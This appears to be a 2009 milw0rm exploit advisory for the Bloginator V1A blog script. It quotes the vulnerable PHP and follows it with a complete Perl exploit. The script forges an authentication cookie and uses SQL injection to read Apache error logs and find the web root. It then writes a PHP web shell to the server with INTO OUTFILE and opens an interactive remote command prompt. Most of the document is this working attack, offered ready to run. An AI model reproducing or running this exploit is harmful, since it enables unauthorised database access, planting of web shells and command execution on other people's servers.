<html><head><title>Bloginator v1a SQL Command Injection via Cookie Bypass Exploit</title></head><pre>##########################################################################

Author = FireShot , Jacopo Vuga.
Thx to = Osirys for develop the Exploitation Code with me
Mail = fireshot&lt;at&gt;autistici&lt;dot&gt;org / osirys&lt;at&gt;autistici&lt;dot&gt;org

Vulnerability = SQL Command Injection (mq = off)
Software = Bloginator V1A
Download = http://kamads.com/kamads_ads/download.php?email=bloginator&amp;ID=0

Greets to = Myral, str0ke

###########################################################################

[CODE]


[URL] www.site.com/bloginator/articleCall.php

global $name,$password,$returnLink;
$p_name = strip_tags(substr($_POST['name'],0,32));
$p_password = strip_tags(substr($_POST['password'],0,32));
if(crypt($p_name , $name) == $name and crypt($p_password,$password) == $password )
{

          setcookie(&quot;identifyYourself&quot;,&quot;you are identified&quot;);
          print &quot;Login successfull&lt;br&gt;&quot;;
          print $returnLink;
      }
  else {print &quot;Wrong username or password&quot;;
  }
}
[...]
$action = @$_GET['action'];
[...]
$id = $_GET['id'];
[...]
function editArticle($id,$message)
{
global $returnLink;
$query = &quot;select * FROM articles WHERE id='$id'&quot;;
$sql = mysql_query($query) or die(mysql_query());
$title = mysql_result($sql,0,'title');
$title = htmlentities($title);
$article = mysql_result($sql,0,'article');
$article = htmlentities($article);
$link = mysql_result($sql,0,'link');
$link = htmlentities($link);

startHTML(&quot;Edit ID # &quot;.$id);
?&gt;

[/CODE]


[EXPLOIT]

#!/usr/bin/perl

use IO::Socket;
use LWP::UserAgent;

my $host = $ARGV[0];
my $rand = int(rand 9) +1;

my @error_logs  =  qw(
                     /var/log/httpd/error.log
                     /var/log/httpd/error_log
                     /var/log/apache/error.log
                     /var/log/apache/error_log
                     /var/log/apache2/error.log
                     /var/log/apache2/error_log
                     /logs/error.log
                     /var/log/apache/error_log
                     /var/log/apache/error.log
                     /usr/local/apache/logs/error_log
                     /etc/httpd/logs/error_log
                     /etc/httpd/logs/error.log
                     /var/www/logs/error_log
                     /var/www/logs/error.log
                     /usr/local/apache/logs/error.log
                     /var/log/error_log
                     /apache/logs/error.log
                   );

my $php_c0de   =  &quot;&lt;?php echo \&quot;st4rt\&quot;;system(\$_GET[cmd]);?&gt;&quot;;

($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


print &quot;[*] Generating error through GET request ..\n&quot;;

get_req($host.&quot;/osirys_log_test&quot;.$rand);

print &quot;[*] Cheeking Apache Error Log path ..\n&quot;;

while (($log = &lt;@error_logs&gt;)&amp;&amp;($gotcha != 1)) {
   my $regexp = &quot;File does not exist: (.+)\/osirys_log_test$rand&quot;;
   my $sql_load_file = &quot;/articleCall.php?action=edit&amp;id=osirys' union select 1,2,3,4,load_file('&quot;.$log.&quot;'),6,7 order by '*&quot;;
   $re = sql_socket($sql_load_file,$regexp,&quot;1&quot;);
   if ($re !~ /Failed/) {
       $site_path = $re;
       $ok = 1;
   }
   if ($ok == 1) {
       print &quot;[*] Error Log path found -&gt; $log\n&quot;;
       print &quot;[*] Website path found -&gt; $site_path\n&quot;;
       &amp;inj_shell;
   }
   else {
       print &quot;[-] Couldn't file error_log !\n&quot;;
   }
}

sub inj_shell {
   my $attack  = &quot;/articleCall.php?action=edit&amp;id=osirys' union select 1,2,3,4,'&quot;.$php_c0de.&quot;',6,7 into outfile '&quot;.$site_path.&quot;/1337.php&quot;;
   my $regexp  = &quot;st4rt&quot;;
   my $re = sql_socket($attack,$regexp,&quot;2&quot;);
   if ($re == 1) {
       print &quot;[*] Shell succesfully injected !\n&quot;;
       print &quot;[&amp;] Hi my master, do your job now [!]\n\n&quot;;
       $exec_path = $host.&quot;/1337.php&quot;;
       &amp;exec_cmd;

   }
   else {
       print &quot;[-] Shell not found \n[-] Exploit failed\n\n&quot;;
       exit(0);
   }
}

sub exec_cmd {
   $h0st !~ /www\./ || $h0st =~ s/www\.//;
   print &quot;shell[$h0st]\$&gt; &quot;;
   $cmd = &lt;STDIN&gt;;
   $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
   my $exec_path_ = $exec_path.&quot;?cmd=&quot;.$cmd;
   my $re = get_req($exec_path_);
   my $content = tag($re);
   if ($content =~ /st4rt(.+)\*\*6/) {
       my $out = $1;
       $out =~ s/\$/ /g;
       $out =~ s/\*/\n/g;
       chomp($out);
       print &quot;$out\n&quot;;
       &amp;exec_cmd;
   }
   else {
       $c++;
       $cmd =~ s/\n//;
       print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
       $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
       &amp;exec_cmd;
   }
}

sub sql_socket() {

   my($sql,$regexp,$way) = @_;
   $sql = tag_encode($sql);

   my $url = $path.&quot;/&quot;.$sql;

   my $data = &quot;GET &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
              &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
              &quot;Keep-Alive: 300\r\n&quot;.
              &quot;Connection: keep-alive\r\n&quot;.
              &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
              &quot;Cookie: identifyYourself=you+are+identified;\r\n&quot;.
              &quot;Content-Length: 0\r\n\r\n&quot;.
              &quot;\r\n&quot;;

   my $socket   =  new IO::Socket::INET(
                                            PeerAddr =&gt; $h0st,
                                            PeerPort =&gt; '80',
                                            Proto    =&gt; 'tcp',
                                       ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

   $socket-&gt;send($data);

   if ($way == 1) {
       while ((my $e = &lt;$socket&gt;)&amp;&amp;($stop != 1)) {
           if ($e =~ /$regexp/) {
               $gotcha = $1;
               $stop = 1;
           }
       }
   }
   elsif ($way == 2) {
       my $re = get_req($host.&quot;/1337.php&quot;);
       if ($re =~ /st4rt/) {
           $gotcha = 1;
           $stop = 1;
       }
       else {
           $gotcha = 0;
           $stop = 0;
       }
   }
   if ($stop == 1) {
       return($gotcha);
   }
   else {
       return(&quot;Failed&quot;);
   }

}

sub get_req() {
   $link = $_[0];
   my $req = HTTP::Request-&gt;new(GET =&gt; $link);
   my $ua = LWP::UserAgent-&gt;new();
   $ua-&gt;timeout(4);
   my $response = $ua-&gt;request($req);
   return $response-&gt;content;
}

sub cheek() {
   my $host = $_[0];
   if ($host =~ /http:\/\/(.*)/) {
       return 1;
   }
   else {
       return 0;
   }
}

sub get_input() {
   my $host = $_[0];
   $host =~ /http:\/\/(.*)/;
   $s_host = $1;
   $s_host =~ /([a-z.-]{1,30})\/(.*)/;
   ($h0st,$path) = ($1,$2);
   $path =~ s/(.*)/\/$1/;
   $full_det = $h0st.&quot; &quot;.$path;
   return $full_det;
}

sub tag() {
   my $string = $_[0];
   $string =~ s/ /\$/g;
   $string =~ s/\s/\*/g;
   return($string);
}

sub tag_encode() {
   my $sql = $_[0];
   $sql =~ s/ /\%20/g;
   $sql =~ s/&lt;/\%3C/g;
   $sql =~ s/&gt;/\%3E/g;
   $sql =~ s/&quot;/\%22/g;
   return($sql);
}

sub banner {
   print &quot;\n&quot;.
         &quot;  ---------------------------\n&quot;.
         &quot;     SQL Command Injection   \n&quot;.
         &quot;       via Cookie Bypass     \n&quot;.
     &quot;         Bloginator V1A      \n&quot;.
         &quot;     by FireShot &amp; Osirys    \n&quot;.
         &quot;  ---------------------------\n\n&quot;;
}

sub help() {
   my $error = $_[0];
   if ($error == -1) {
       &amp;banner;
       print &quot;\n[-] Input data failed ! \n&quot;;
   }
   elsif ($error == -2) {
       &amp;banner;
       print &quot;\n[-] Bad hostname address !\n&quot;;
   }
   print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
   exit(0);
}

[/EXPLOIT]

############################################################################ 

# milw0rm.com [2009-03-19]</pre></html>